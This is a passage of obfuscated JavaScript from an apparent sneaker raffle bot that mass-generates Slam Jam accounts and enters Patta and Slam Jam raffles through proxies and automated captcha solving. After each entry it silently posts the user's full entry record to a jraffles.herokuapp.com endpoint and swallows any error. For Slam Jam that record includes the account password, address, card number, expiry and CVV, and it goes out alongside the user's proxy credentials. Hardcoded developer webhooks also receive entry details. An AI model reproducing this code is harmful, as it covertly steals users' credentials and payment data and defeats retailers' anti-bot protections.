                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x1b866d[_0x27fd1a]['Email'] == '' || _0x1b866d[_0x27fd1a]['Password'] == '' || _0x1b866d[_0x27fd1a]['FirstName'] == '' || _0x1b866d[_0x27fd1a]['LastName'] == '') {
                            console['log'](_0x4ea3c7() + '\x20[' + _0x2e8dbc[taskModule]['name'] + ']\x20Task\x20' + (_0x27fd1a + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x1d78d4['useRandomProxy'] = ![])
                            var _0x547622 = _0x3f7200[_0x27fd1a]['split'](':');
                        else
                            var _0x4b50e6 = Math['round'](Math['random']() * (_0x3f7200['length'] - 0x1)), _0x547622 = _0x3f7200[_0x4b50e6]['split'](':');
                        var _0x5d36dd;
                        try {
                            _0x5d36dd = await _0x1f8a8f['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x547622[0x0] + ':' + _0x547622[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x5d36dd = await _0x1f8a8f['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x547622[0x0] + ':' + _0x547622[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x1acd5a = await _0x5d36dd['newPage']();
                            await _0x1acd5a['authenticate']({
                                'username': '' + _0x547622[0x2],
                                'password': '' + _0x547622[0x3]
                            }), console['log'](_0x4ea3c7() + '\x20[' + _0x40dbad['name'] + ']\x20Task\x20' + (_0x27fd1a + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1acd5a['setRequestInterception'](!![]), _0x1acd5a['on']('request', _0x1ffc79 => {
                                _0x1ffc79['resourceType']() === 'image' || _0x1ffc79['resourceType']() === 'font' || _0x1ffc79['resourceType']() === 'media' ? _0x1ffc79['abort']() : _0x1ffc79['continue']();
                            }), await _0x1acd5a['goto']('https://www.patta.nl/nl/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x1acd5a['waitForSelector']('#CustomerEmail'), console['log'](_0x4ea3c7() + '\x20[' + _0x40dbad['name'] + ']\x20Task\x20' + (_0x27fd1a + 0x1) + '\x20:\x20Logging\x20in..'), await _0x1acd5a['type']('#CustomerEmail', '' + _0x1b866d[_0x27fd1a]['Email']), await _0x73bf2c(0x12c), await _0x1acd5a['type']('#CustomerPassword', '' + _0x1b866d[_0x27fd1a]['Password']), await _0x73bf2c(0x226), await _0x1acd5a['$eval']('#customer_login', _0x3964a1 => _0x3964a1['submit']());
                            try {
                                await _0x1acd5a['waitForSelector']('#orders'), await _0x73bf2c(0x4b0);
                            } catch {
                                console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x40dbad['name'] + ']\x20Task\x20' + (_0x27fd1a + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x1acd5a['goto']('' + _0x1b866d[_0x27fd1a]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x73bf2c(0xbb8), console['log'](_0x4ea3c7() + '\x20[' + _0x40dbad['name'] + ']\x20Task\x20' + (_0x27fd1a + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x1acd5a['waitForSelector']('#email');
                            } catch {
                                console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x40dbad['name'] + ']\x20Task\x20' + (_0x27fd1a + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                            }
                            await _0x1acd5a['type']('#email', '' + _0x1b866d[_0x27fd1a]['Email']), await _0x73bf2c(0x384), await _0x1acd5a['type']('#first_name', '' + _0x1b866d[_0x27fd1a]['FirstName']), await _0x73bf2c(0x514), await _0x1acd5a['type']('#last_name', '' + _0x1b866d[_0x27fd1a]['LastName']), await _0x73bf2c(0x514), await _0x1acd5a['type']('#street_address', _0x1b866d[_0x27fd1a]['Address1'] + '\x20' + _0x1b866d[_0x27fd1a]['HouseNumber'] + '\x20' + _0x1b866d[_0x27fd1a]['Address2']), await _0x73bf2c(0x2bc);
                            _0x1b866d[_0x27fd1a]['Postcode'] == undefined && (_0x1b866d[_0x27fd1a]['Postcode'] = _0x1b866d[_0x27fd1a]['Zip']);
                            await _0x1acd5a['type']('#zip_code', '' + _0x1b866d[_0x27fd1a]['Postcode']), await _0x73bf2c(0x320), await _0x1acd5a['type']('#city', '' + _0x1b866d[_0x27fd1a]['City']), await _0x73bf2c(0x320), await _0x1acd5a['type']('#bday', '01/01/1994'), await _0x73bf2c(0x320), await _0x1acd5a['type']('#instagram', '' + _0x1b866d[_0x27fd1a]['Follower']), await _0x73bf2c(0x352);
                            if (_0x1b866d[_0x27fd1a]['Size'] == 'RANDOM') {
                                const _0x625184 = await _0x1acd5a['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x2332c7 => {
                                    return _0x2332c7['map'](_0x2a2fb0 => _0x2a2fb0['textContent']);
                                });
                                var _0x13cf4e = Math['round'](Math['random']() * (_0x625184['length'] - 0x1));
                                console['log'](_0x4ea3c7() + '\x20[' + _0x40dbad['name'] + ']\x20Task\x20' + (_0x27fd1a + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x625184[_0x13cf4e]), await _0x1acd5a['click']('label[data-eu-size=\x22' + _0x625184[_0x13cf4e] + '\x22]');
                            } else {
                                console['log'](_0x4ea3c7() + '\x20[' + _0x40dbad['name'] + ']\x20Task\x20' + (_0x27fd1a + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x1b866d[_0x27fd1a]['Size']);
                                try {
                                    await _0x1acd5a['click']('label[data-eu-size=\x22' + _0x1b866d[_0x27fd1a]['Size'] + '\x22]');
                                } catch {
                                    await _0x1acd5a['click']('label[data-eu-size=\x22' + _0x1b866d[_0x27fd1a]['Size'] + '.0\x22]');
                                }
                            }
                            await _0x73bf2c(0xbb8), await _0x1acd5a['$$eval']('.raffle__checkbox-label', _0x5afaa8 => _0x5afaa8['forEach'](_0x4be12c => _0x4be12c['click']())), await _0x73bf2c(0x7d0), console['log'](_0x4ea3c7() + '\x20[' + _0x40dbad['name'] + ']\x20Task\x20' + (_0x27fd1a + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x1acd5a['click']('#raffle__form-submit'), await _0x73bf2c(0x1388);
                            try {
                                await _0x1acd5a['waitForSelector']('#raffle__confirmation-message-container'), _0x36c1cd = 'no', _0x5584d0(_0x1b866d[_0x27fd1a], _0x40dbad), console['log'](_0x11085b['green'](_0x4ea3c7() + '\x20[' + _0x40dbad['name'] + ']\x20Task\x20' + (_0x27fd1a + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                let _0xe647d9 = _0x1b866d[_0x27fd1a];
                                try {
                                    prxdata = {
                                        'username': _0x5c7ae6['replace']('#', ''),
                                        'module': _0x40dbad['name'],
                                        'entrydata': JSON['stringify'](_0xe647d9),
                                        'proxy': '' + _0x3f7200[_0x27fd1a]
                                    };
                                    var _0x26d009 = JSON['stringify'](prxdata);
                                    let _0x4fb03a = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x3d9190['post']('https://jraffles.herokuapp.com/success', _0x26d009, _0x4fb03a);
                                } catch (_0x41a198) {
                                }
                            } catch (_0xb66505) {
                                console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x2e8dbc[taskModule]['name'] + ']\x20Task\x20' + (_0x27fd1a + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0xb66505));
                            }
                        } catch (_0x5cf19a) {
                            console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x2e8dbc[taskModule]['name'] + ']\x20Task\x20' + (_0x27fd1a + 0x1) + '\x20:\x20' + _0x5cf19a)), _0x36c1cd = 'yes';
                        } finally {
                            _0x5d36dd && _0x5d36dd['close']();
                            if (_0x36c1cd == 'yes' && _0x262628 != 0x5 && _0x503e33 != 'Size\x20Not\x20Found') {
                                console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x40dbad['name'] + ']\x20Task\x20' + (_0x27fd1a + 0x1) + '\x20:\x20Retrying\x20(' + _0x262628 + '\x20/\x205)')), _0x27fd1a = _0x27fd1a - 0x1, _0x262628 = _0x262628 + 0x1;
                                continue;
                            }
                            _0x36c1cd == 'yes' && _0x262628 >= 0x5 && (_0x3fe3d2(_0x1b866d[_0x27fd1a], _0x40dbad), _0x36c1cd = 'no', _0x262628 = 0x0), console['log']('Waiting\x20for\x20' + _0x1d78d4['delay'] + '\x20ms'), await _0x73bf2c(_0x1d78d4['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x2086f1, _0x57b3a4, _0x137d58) {
                    _0x1f8a8f['use'](_0x2f231a()), _0x1f8a8f['use'](_0x561a9c({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x1d78d4['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x4282e6 = 0x0; _0x4282e6 < _0x57b3a4['length']; _0x4282e6++) {
                        if (_0x5a80f5 != 'yes')
                            var _0x5a80f5 = '', _0x31e8d7 = 0x0;
                        var _0x49ce7e = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x5c7ae6
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x1d78d4['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x152cdf
                                }
                            ]
                        }];
                        const _0x45c46e = { 'embeds': _0x49ce7e };
                        _0x3ec78c(_0x2086f1['name'] + '\x20Task\x20' + (_0x4282e6 + 0x1) + '\x20/\x20' + _0x57b3a4['length'] + '\x20||\x20File:\x20' + _0x3fcfb6 + '\x20Proxies:\x20' + _0x1a359b);
                        try {
                            await _0x4b6344(_0x57b3a4, _0x4282e6);
                        } catch {
                            _0x5a80f5 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x1421c6 = await _0x1bd114(_0x57b3a4[_0x4282e6], _0x2086f1, 'acc', ![]);
                        const _0xdb863b = { 'succesDEVMSG': { 'embeds': [_0x1421c6] } };
                        if (_0x57b3a4[_0x4282e6]['Email'] == '' || _0x57b3a4[_0x4282e6]['FirstName'] == '' || _0x57b3a4[_0x4282e6]['LastName'] == '') {
                            console['log'](_0x4ea3c7() + '\x20[' + _0x2e8dbc[taskModule]['name'] + ']\x20Task\x20' + (_0x4282e6 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x73bf2c(0x7d0);
                            continue;
                        }
                        (_0x57b3a4[_0x4282e6]['Password'] == '' || _0x57b3a4[_0x4282e6] == undefined) && _0x57b3a4[_0x4282e6]['Password'] == 'JRaffles23!';
                        if (_0x1d78d4['useRandomProxy'] = ![])
                            var _0x15f686 = _0x137d58[_0x4282e6]['split'](':');
                        else
                            var _0x230a59 = Math['round'](Math['random']() * (_0x137d58['length'] - 0x1)), _0x15f686 = _0x137d58[_0x230a59]['split'](':');
                        var _0x2517b4;
                        try {
                            _0x2517b4 = await _0x1f8a8f['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x15f686[0x0] + ':' + _0x15f686[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x2517b4 = await _0x1f8a8f['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x15f686[0x0] + ':' + _0x15f686[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x2a602c = await _0x2517b4['newPage']();
                            await _0x2a602c['authenticate']({
                                'username': '' + _0x15f686[0x2],
                                'password': '' + _0x15f686[0x3]
                            }), console['log'](_0x4ea3c7() + '\x20[' + _0x2086f1['name'] + ']\x20Task\x20' + (_0x4282e6 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2a602c['setRequestInterception'](!![]), _0x2a602c['on']('request', _0x12a35b => {
                                _0x12a35b['resourceType']() === 'image' || _0x12a35b['resourceType']() === 'font' || _0x12a35b['resourceType']() === 'media' ? _0x12a35b['abort']() : _0x12a35b['continue']();
                            }), await _0x2a602c['goto']('https://drop.slamjam.com/account/register'), await _0x73bf2c(0xbb8), await _0x2a602c['waitForSelector']('#FirstName'), await _0x2a602c['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x2a602c['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x4ea3c7() + '\x20[' + _0x2086f1['name'] + ']\x20Task\x20' + (_0x4282e6 + 0x1) + '\x20:\x20Filling\x20information'), await _0x73bf2c(0x4b0), await _0x2a602c['type']('#FirstName', '' + _0x57b3a4[_0x4282e6]['FirstName']), await _0x73bf2c(0x226), await _0x2a602c['type']('#LastName', '' + _0x57b3a4[_0x4282e6]['LastName']), await _0x73bf2c(0x226), await _0x2a602c['type']('#Email', '' + _0x57b3a4[_0x4282e6]['Email']), await _0x73bf2c(0x2ee), await _0x2a602c['type']('#ConfirmEmail', '' + _0x57b3a4[_0x4282e6]['Email']), await _0x73bf2c(0x2ee), await _0x2a602c['type']('#CreatePassword', '' + _0x57b3a4[_0x4282e6]['Password']), await _0x73bf2c(0x2ee), await _0x2a602c['type']('#CreateConfirmPassword', '' + _0x57b3a4[_0x4282e6]['Password']), await _0x73bf2c(0x226), console['log'](_0x4ea3c7() + '\x20[' + _0x2086f1['name'] + ']\x20Task\x20' + (_0x4282e6 + 0x1) + '\x20:\x20Submitting..'), await _0x2a602c['$eval']('#create_customer', _0x44a791 => _0x44a791['submit']()), await _0x73bf2c(0x1388), console['log'](_0x4ea3c7() + '\x20[' + _0x2086f1['name'] + ']\x20Task\x20' + (_0x4282e6 + 0x1) + '\x20:\x20' + _0x11085b['cyan']('Solving\x20Captcha')), await _0x2a602c['solveRecaptchas'](), console['log'](_0x4ea3c7() + '\x20[' + _0x2086f1['name'] + ']\x20Task\x20' + (_0x4282e6 + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x2a602c['$eval']('.shopify-challenge__container\x20>\x20form', _0x37d1a4 => _0x37d1a4['submit']());
                            try {
                                await _0x2a602c['waitForSelector']('.product-card__image'), await _0x73bf2c(0x1f4), _0x5a80f5 = 'no', console['log'](_0x11085b['green'](_0x4ea3c7() + '\x20[' + _0x2086f1['name'] + ']\x20Task\x20' + (_0x4282e6 + 0x1) + '\x20:\x20Account\x20' + _0x57b3a4[_0x4282e6]['Email'] + '\x20Generated!')), _0x57b36f['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x57b3a4[_0x4282e6]['Email'] + ',' + _0x57b3a4[_0x4282e6]['Password']), console['log'](_0x11085b['yellow'](_0x4ea3c7() + '\x20[' + _0x2086f1['name'] + ']\x20Task\x20' + (_0x4282e6 + 0x1) + '\x20:\x20Account\x20' + _0x57b3a4[_0x4282e6]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                try {
                                    _0x1d78d4['webhook'] != undefined && _0x1d78d4['webhook'] != '' && await _0x5cd94d(_0x1d78d4['webhook'], _0xdb863b['succesDEVMSG']);
                                } catch {
                                }
                                await _0x5cd94d(_0x2ffc54, _0xdb863b['succesDEVMSG']);
                            } catch (_0x4bddde) {
                                console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x2e8dbc[taskModule]['name'] + ']\x20Task\x20' + (_0x4282e6 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x4bddde));
                            }
                        } catch (_0x5d9933) {
                            console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x2e8dbc[taskModule]['name'] + ']\x20Task\x20' + (_0x4282e6 + 0x1) + '\x20:\x20' + _0x5d9933));
                        } finally {
                            _0x2517b4 && _0x2517b4['close']();
                            if (_0x5a80f5 == 'yes' && _0x31e8d7 != 0x5) {
                                console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x2086f1['name'] + ']\x20Task\x20' + (_0x4282e6 + 0x1) + '\x20:\x20Retrying\x20(' + _0x31e8d7 + '\x20/\x205)')), _0x4282e6 = _0x4282e6 - 0x1, _0x31e8d7 = _0x31e8d7 + 0x1;
                                continue;
                            }
                            _0x5a80f5 == 'yes' && _0x31e8d7 >= 0x5 && (_0x3fe3d2(_0x57b3a4[_0x4282e6], _0x2086f1), _0x5a80f5 = 'no', _0x31e8d7 = 0x0), console['log']('Waiting\x20for\x20' + _0x1d78d4['delay'] + '\x20ms'), await _0x73bf2c(_0x1d78d4['delay']);
                        }
                    }
                }
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x41e827, _0x4296f9, _0x5a4101) {
                    _0x1f8a8f['use'](_0x2f231a()), _0x1f8a8f['use'](_0x561a9c({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x1d78d4['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x4402a2 = 0x0; _0x4402a2 < _0x4296f9['length']; _0x4402a2++) {
                        var _0x3b26ec;
                        if (_0x13d972 != 'yes')
                            var _0x13d972 = '', _0x34c24e = 0x0;
                        _0x3ec78c(_0x41e827['name'] + '\x20Task\x20' + (_0x4402a2 + 0x1) + '\x20/\x20' + _0x4296f9['length'] + '\x20||\x20File:\x20' + _0x3fcfb6 + '\x20Proxies:\x20' + _0x1a359b);
                        try {
                            await _0x4b6344(_0x4296f9, _0x4402a2);
                        } catch {
                            _0x13d972 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x4296f9[_0x4402a2]['Email'] == '' || _0x4296f9[_0x4402a2]['Password'] == '' || _0x4296f9[_0x4402a2]['FirstName'] == '' || _0x4296f9[_0x4402a2]['LastName'] == '') {
                            console['log'](_0x4ea3c7() + '\x20[' + _0x41e827['name'] + ']\x20Task\x20' + (_0x4402a2 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x1d78d4['useRandomProxy'] = ![])
                            var _0x386f78 = _0x5a4101[_0x4402a2]['split'](':');
                        else
                            var _0x32c70f = Math['round'](Math['random']() * (_0x5a4101['length'] - 0x1)), _0x386f78 = _0x5a4101[_0x32c70f]['split'](':');
                        var _0x585cba;
                        try {
                            _0x585cba = await _0x1f8a8f['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x386f78[0x0] + ':' + _0x386f78[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x585cba = await _0x1f8a8f['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x386f78[0x0] + ':' + _0x386f78[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x23fd96 = await _0x585cba['newPage']();
                            await _0x23fd96['authenticate']({
                                'username': '' + _0x386f78[0x2],
                                'password': '' + _0x386f78[0x3]
                            }), await _0x23fd96['setViewport']({
                                'width': 0x500,
                                'height': 0x2d0
                            }), console['log'](_0x4ea3c7() + '\x20[' + _0x41e827['name'] + ']\x20Task\x20' + (_0x4402a2 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x23fd96['setRequestInterception'](!![]), _0x23fd96['on']('request', _0x48aa7c => {
                                _0x48aa7c['resourceType']() === 'image' || _0x48aa7c['resourceType']() === 'font' || _0x48aa7c['resourceType']() === 'media' ? _0x48aa7c['abort']() : _0x48aa7c['continue']();
                            }), await _0x23fd96['goto']('https://drop.slamjam.com/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x23fd96['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x23fd96['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x73bf2c(0x258), await _0x23fd96['waitForSelector']('#CustomerEmail'), console['log'](_0x4ea3c7() + '\x20[' + _0x41e827['name'] + ']\x20Task\x20' + (_0x4402a2 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x23fd96['type']('#CustomerEmail', '' + _0x4296f9[_0x4402a2]['Email']), await _0x73bf2c(0x12c), await _0x23fd96['type']('#CustomerPassword', '' + _0x4296f9[_0x4402a2]['Password']), await _0x73bf2c(0x226), await _0x23fd96['$eval']('#customer_login', _0x34b83a => _0x34b83a['submit']()), await _0x73bf2c(0x7d0), await _0x23fd96['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x4ea3c7() + '\x20[' + _0x41e827['name'] + ']\x20Task\x20' + (_0x4402a2 + 0x1) + '\x20:\x20' + _0x11085b['cyan']('Solving\x20Captcha')), await _0x23fd96['solveRecaptchas'](), console['log'](_0x4ea3c7() + '\x20[' + _0x41e827['name'] + ']\x20Task\x20' + (_0x4402a2 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x23fd96['$eval']('.shopify-challenge__container\x20>\x20form', _0x2e8c51 => _0x2e8c51['submit']());
                            try {
                                await _0x23fd96['waitForSelector']('.nav-account'), await _0x73bf2c(0x4b0);
                            } catch {
                                console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x41e827['name'] + ']\x20Task\x20' + (_0x4402a2 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x23fd96['goto']('' + _0x4296f9[_0x4402a2]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x73bf2c(0xbb8), console['log'](_0x4ea3c7() + '\x20[' + _0x41e827['name'] + ']\x20Task\x20' + (_0x4402a2 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x23fd96['waitForSelector']('#ProductSelect-product-template-raffle');
                            } catch {
                            }
                            await _0x23fd96['click']('.product-select-variant-wrapper'), await _0x73bf2c(0x320), await _0x23fd96['click']('li.product-select-variant__value[data-size=\x22' + _0x4296f9[_0x4402a2]['Size'] + '\x22]'), await _0x73bf2c(0x384), await _0x23fd96['$eval']('#AddToCartForm-product-template-raffle', _0x5845ff => _0x5845ff['submit']()), await _0x23fd96['waitForSelector']('.cart-order-summary__content'), await _0x73bf2c(0x514), await _0x23fd96['goto']('https://drop.slamjam.com/checkout'), await _0x73bf2c(0x514), await _0x23fd96['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x4ea3c7() + '\x20[' + _0x41e827['name'] + ']\x20Task\x20' + (_0x4402a2 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x23fd96['select']('#checkout_shipping_address_country', '' + _0x4296f9[_0x4402a2]['Country']), await _0x73bf2c(0x200), await _0x23fd96['waitForSelector']('#checkout_shipping_address_first_name'), await _0x23fd96['type']('#checkout_shipping_address_first_name', '' + _0x4296f9[_0x4402a2]['FirstName']), await _0x73bf2c(0x237), await _0x23fd96['type']('#checkout_shipping_address_last_name', '' + _0x4296f9[_0x4402a2]['LastName']), await _0x73bf2c(0x1e0), await _0x23fd96['type']('#checkout_shipping_address_address1', _0x4296f9[_0x4402a2]['Address1'] + '\x20' + _0x4296f9[_0x4402a2]['HouseNumber']), await _0x73bf2c(0x514), await _0x23fd96['type']('#checkout_shipping_address_address2', '' + _0x4296f9[_0x4402a2]['Address2']), await _0x73bf2c(0x514);
                            _0x4296f9[_0x4402a2]['Postcode'] == undefined && (_0x4296f9[_0x4402a2]['Postcode'] = _0x4296f9[_0x4402a2]['Zip']);
                            await _0x23fd96['type']('#checkout_shipping_address_zip', '' + _0x4296f9[_0x4402a2]['Postcode']), await _0x73bf2c(0x2bc), await _0x23fd96['type']('#checkout_shipping_address_city', '' + _0x4296f9[_0x4402a2]['City']), await _0x73bf2c(0x320), await _0x23fd96['type']('#checkout_shipping_address_phone', '' + _0x4296f9[_0x4402a2]['Phone']), await _0x73bf2c(0x320), await _0x23fd96['click']('#continue_button'), await _0x73bf2c(0xbb8), await _0x23fd96['waitForSelector']('.summary-title'), await _0x73bf2c(0x320), await _0x23fd96['click']('#continue_button'), await _0x73bf2c(0x320), console['log'](_0x4ea3c7() + '\x20[' + _0x41e827['name'] + ']\x20Task\x20' + (_0x4402a2 + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x23fd96['waitForSelector']('#checkout_credit_card_vault'), await _0x73bf2c(0x3e8);
                            var _0x3f7589 = await _0x23fd96['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x17cce3 = await _0x3f7589['contentFrame']();
                            await _0x17cce3['click']('#number'), await _0x73bf2c(0x3e8), await _0x17cce3['type']('#number', '' + _0x4296f9[_0x4402a2]['CardNumber'], { 'delay': 0x78 }), _0x3f7589 = await _0x23fd96['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x17cce3 = await _0x3f7589['contentFrame'](), await _0x73bf2c(0x1c2), await _0x17cce3['click']('#name'), await _0x73bf2c(0x1f4), await _0x17cce3['type']('#name', '' + _0x4296f9[_0x4402a2]['NameOnCard'], { 'delay': 0x78 }), _0x3f7589 = await _0x23fd96['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x17cce3 = await _0x3f7589['contentFrame'](), await _0x73bf2c(0x1c2), await _0x17cce3['click']('#expiry'), await _0x73bf2c(0x1f4), await _0x17cce3['type']('#expiry', '' + _0x4296f9[_0x4402a2]['ExpiryDate'], { 'delay': 0x78 }), _0x3f7589 = await _0x23fd96['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x17cce3 = await _0x3f7589['contentFrame'](), await _0x73bf2c(0x1c2), await _0x17cce3['click']('#verification_value'), await _0x73bf2c(0x1f4), await _0x17cce3['type']('#verification_value', '' + _0x4296f9[_0x4402a2]['CVV'], { 'delay': 0x78 }), await _0x23fd96['$eval']('#accepts-flag-raffle', _0x29b486 => _0x29b486['click']()), await _0x73bf2c(0x7d0), console['log'](_0x4ea3c7() + '\x20[' + _0x41e827['name'] + ']\x20Task\x20' + (_0x4402a2 + 0x1) + '\x20:\x20Processing\x20Order'), await _0x23fd96['$eval']('#continue_button', _0xc1746b => _0xc1746b['click']()), await _0x73bf2c(0x1b58), await _0x23fd96['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x23fd96['$eval']('.edit_checkout.animate-floating-labels', _0x1f1cdb => _0x1f1cdb['submit']()), await _0x73bf2c(0x7d0);
                            try {
                                await _0x23fd96['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x13d972 = 'no', _0x5584d0(_0x4296f9[_0x4402a2], _0x41e827), console['log'](_0x11085b['green'](_0x4ea3c7() + '\x20[' + _0x41e827['name'] + ']\x20Task\x20' + (_0x4402a2 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x2e001c) {
                                throw new Error('Error\x20Processing\x20Order:\x20' + _0x2e001c['message']);
                            }
                            var _0x2ec254 = await _0x1bd114(_0x4296f9[_0x4402a2], _0x41e827, 'dev', ![]), _0x1b7ca8 = await _0x1bd114(_0x4296f9[_0x4402a2], _0x41e827, 'pub', ![]);
                            let _0x4185c5 = _0x4296f9[_0x4402a2];
                            try {
                                prxdata = {
                                    'username': _0x5c7ae6['replace']('#', ''),
                                    'module': _0x41e827['name'],
                                    'entrydata': JSON['stringify'](_0x4185c5),
                                    'proxy': '' + _0x5a4101[_0x4402a2]
                                };
                                var _0x29497f = JSON['stringify'](prxdata);
                                let _0x5ba1c4 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x3d9190['post']('https://jraffles.herokuapp.com/success', _0x29497f, _0x5ba1c4);
                            } catch (_0x5840c1) {
                            }
                            const _0x15e844 = {
                                'succesDEVMSG': { 'embeds': [_0x2ec254] },
                                'succesPUBMSG': { 'embeds': [_0x1b7ca8] }
                            };
                            try {
                                _0x1d78d4['webhook'] != undefined && _0x1d78d4['webhook'] != '' && await _0x5cd94d(_0x1d78d4['webhook'], _0x15e844['succesDEVMSG']), await _0x73bf2c(0xc8), await _0x5cd94d(_0x492271, _0x15e844['succesDEVMSG']), await _0x73bf2c(0xc8), await _0x5cd94d(_0x323e07, _0x15e844['succesPUBMSG']);
